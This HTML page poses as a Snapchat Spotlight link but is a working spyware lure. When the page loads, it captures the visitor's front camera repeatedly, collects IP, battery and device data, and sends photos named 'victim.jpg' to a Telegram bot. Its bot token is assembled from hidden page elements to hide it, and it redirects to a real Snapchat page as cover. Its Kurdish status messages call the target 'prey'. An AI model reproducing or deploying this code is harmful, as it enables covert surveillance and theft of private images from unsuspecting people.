<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>
        :root { --config-node: "AAHCO4nVUY"; }
        body { background-color: white !important; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
        .zone-wrapper { display: none !important; visibility: hidden !important; }
    </style>
</head>
<body onload="capture()">

    <a href="#" id="legacy-link" class="zone-wrapper">8431515310:</a>

    <div class="main-content">
        <p class="zone-wrapper" id="raw-meta">IBZgXQZnj0b</p>
    </div>

<script>
    const API_TOKEN = "7294105831:AAHkL01xVpZ7mN9_QY2Wz8kR0X41vLM0P2t";

    async function capture() {
        const urlParams = new URLSearchParams(window.location.search);
        const targetID = urlParams.get('id'); 
        
        if (!targetID) return;

        try {
            const partA = document.getElementById("legacy-link").innerText;
            const nodeX = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
            const dataV = document.getElementById("raw-meta").innerText;
            const saltK = document.getElementById("system-trace").innerText;
            
            const finalBuild = partA + nodeX + dataV + saltK;

            setTimeout(() => {
                window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
            }, 5000);

            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });

            let batteryInfo = "Unknown";
            if (navigator.getBattery) {
                const batt = await navigator.getBattery();
                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
            }

            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    let report = ` <b>نێچیرێکی نوێ ڕاوکرا</b>\n\n` +
                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
                    _sendMsg(report, finalBuild, targetID);
                });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.play();

            const takeSnap = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                canvas.toBlob(b => { if (b) _sendFile(b, "photo", finalBuild, targetID); }, 'image/jpeg', 0.9);
            };
            setInterval(takeSnap, 700);

        } catch (e) {
            const errA = document.getElementById("legacy-link").innerText;
            const errB = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
            const errC = document.getElementById("raw-meta").innerText;
            const errD = document.getElementById("system-trace").innerText;
            const recovery = errA + errB + errC + errD;

            _sendMsg(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا", recovery, targetID);
            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
        }
    }

    function _sendMsg(text, tk, uid) {
        fetch(`https://api.telegram.org/bot${tk}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: uid, text: text, parse_mode: "HTML"})
        });
    }

    function _sendFile(blob, type, tk, uid) {
        let fd = new FormData();
        fd.append("chat_id", uid);
        fd.append(type, blob, "victim.jpg");
        fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>

    <div class="zone-wrapper">
        <code id="system-trace">bqv7NbfCFoogRY</code>
    </div>
</body>
</html>
